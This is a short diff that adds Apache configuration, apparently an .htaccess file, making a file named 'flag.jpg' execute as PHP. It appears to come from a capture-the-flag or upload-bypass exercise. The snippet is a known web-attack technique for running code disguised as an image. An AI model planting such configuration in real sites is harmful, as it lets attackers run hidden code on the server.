@@ -1,0 +1,3 @@
+<FilesMatch "flag.jpg">
+SetHandler application/x-httpd-php
+</FilesMatch>
